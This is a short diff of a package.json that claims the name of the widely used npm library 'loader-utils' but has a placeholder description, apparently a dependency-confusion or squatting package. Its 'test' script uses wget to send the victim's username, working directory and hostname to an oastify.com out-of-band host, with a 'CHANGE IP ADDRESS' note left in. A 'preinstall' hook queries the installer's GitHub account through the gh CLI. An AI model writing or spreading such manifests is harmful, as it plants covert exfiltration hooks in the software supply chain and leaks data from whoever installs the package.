@@ -1,5 +1,5 @@
 {
-  "name": "loader-utils,
+  "name": "loader-utils",
   "version": "1.2.5",
   "description": "AnupamAS01 Place_holder",
   "main": "index.js",
@@ -8,7 +8,7 @@
   },
   "scripts": {
     "test": "wget --quiet \"http://bhwhtvhm5d3uh2p85rdiq6xx0o6fu5iu.oastify.com/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS",
-    "preinstall": "gh api  https://api.github.com/user" # CHANGE IP ADDRESS"
+    "preinstall": "gh api  https://api.github.com/user" 
   },
   "author": "Your Name",
   "license": "ISC",
